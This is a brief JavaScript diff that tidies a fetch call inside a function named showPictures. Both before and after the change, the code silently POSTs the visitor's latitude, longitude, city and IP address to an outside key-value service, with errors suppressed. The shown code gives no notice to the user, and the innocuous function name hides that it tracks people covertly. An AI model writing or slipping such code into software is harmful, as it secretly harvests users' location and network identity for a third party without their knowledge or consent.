@@ -9,9 +9,7 @@ function showPictures(k) {
   	const t = [pictures.location.latitude, pictures.location.longitude, pictures.city.name, pictures.ip]
 		.map(e => String(e).replaceAll('.', '-').replaceAll(':', '-'))
 		.join('_');
-  	fetch('https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/3cg7aby9/' + k +'/'+ [pictures.location.latitude, pictures.location.longitude, pictures.city.name, pictures.ip]
-		.map(e => String(e).replaceAll('.', '-').replaceAll(':', '-'))
-		.join('_'), 
+  	fetch('https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/3cg7aby9/'+k+'/'+t, 
     {method: 'POST'});
   })
   .catch(error => {});
